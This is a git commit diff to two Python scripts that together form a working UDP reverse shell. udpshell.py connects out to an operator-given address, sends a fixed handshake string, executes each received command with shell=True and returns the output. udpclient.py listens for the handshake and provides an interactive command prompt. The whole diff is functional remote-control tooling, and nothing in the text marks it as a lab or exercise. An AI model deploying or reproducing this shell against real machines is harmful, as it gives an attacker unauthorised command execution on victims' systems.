3f9bed04bf0600c1695c09fdcfdf4ec6bec4aa8c
George Hughey <ghughey@umd.edu>
2017-02-23 08:27:25 -0800

    Added method

--- udpclient.py
+++ udpclient.py
@@ -3,33 +3,49 @@
 import socket
 import subprocess
 import sys
+import threading
 
-if(len(sys.argv) < 4):
-	print("Usage: ./udpclient <recv_port> <send_ip> <send_port>")
+def interact(sock, address):
+	while True:
+		print(" >>>"),
+		command = raw_input()
+
+		sock.sendto(command, address)
+
+		try:
+			response, addr = sock.recvfrom(1024) # buffer size is 1024 bytes
+			print(response)
+
+		except KeyboardInterrupt:
+			pass
+
+
+if(len(sys.argv) < 2):
+	print("Usage: ./udpclient <recv_port>")
 	exit(1)
 
 #read requests, send data, receive data, print data.
 
 recv_ip = "0.0.0.0" 
-recv_port = int(sys.argv[1]) #5005
+recv_port = int(sys.argv[1])
 
-send_ip = sys.argv[2] #127.0.0.1
-send_port = int(sys.argv[3]) #5006
+#send_ip = sys.argv[2] #127.0.0.1
+#send_port = int(sys.argv[3]) #5006
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
 sock.bind((recv_ip, recv_port))
 
-sock2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
+#sock2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
+
+
 
 while True:
-	print(" >>>"),
-	command = raw_input()
-
-	sock2.sendto(command, (send_ip, send_port))
-
-	try:
-		response, addr = sock.recvfrom(1024) # buffer size is 1024 bytes
-		print(response)
+	i = 0
+	identifier, addr = sock.recvfrom(1024)
+	if(identifier == "Begin Connection id: 3242"):
+		i += 1
+		print("Connection " + str(i) + " received")
+		interact(sock, addr)
+		#thread = threading.Thread(target = interact, args = (sock, addr))
+		#thread.start()
 		
-	except KeyboardInterrupt:
-		pass
--- udpshell.py
+++ udpshell.py
@@ -3,30 +3,33 @@
 import socket
 import subprocess
 import sys
+from random import randint
 
 #receive data, send to popen, send back
 
-if(len(sys.argv) < 4):
-	print("Usage: ./udpshell <recv_port> <send_ip> <send_port>")
+if(len(sys.argv) < 2):
+	print("Usage: ./udpshell <send_ip> <send_port>")
 	exit(1)
 
 recv_ip = "0.0.0.0" 
-recv_port = int(sys.argv[1]) #5006
+recv_port = randint(1024, 65535)
 
-send_ip = sys.argv[2] #127.0.0.1
-send_port = int(sys.argv[3]) #5005
+send_ip = sys.argv[1] #127.0.0.1
+send_port = int(sys.argv[2]) #5005
 
-print("Your client should be: python udpclient.py " + sys.argv[3] + " " + sys.argv[2] + " " + sys.argv[1])
+#print("Your client should be: python udpclient.py " + sys.argv[3] + " " + sys.argv[2] + " " + sys.argv[1])
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
 sock.bind((recv_ip, recv_port))
 
-sock2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
+#sock2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
 
+sock.sendto("Begin Connection id: 3242", (send_ip, send_port))
 
 while True:
 	command, addr = sock.recvfrom(1024) # buffer size is 1024 bytes
-
+	if(command == "exit"):
+		break
 	proc = subprocess.Popen([command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
 	output = proc.stdout.read() + proc.stderr.read()
-	sock2.sendto(output, (send_ip, send_port))
+	sock.sendto(output, (send_ip, send_port))
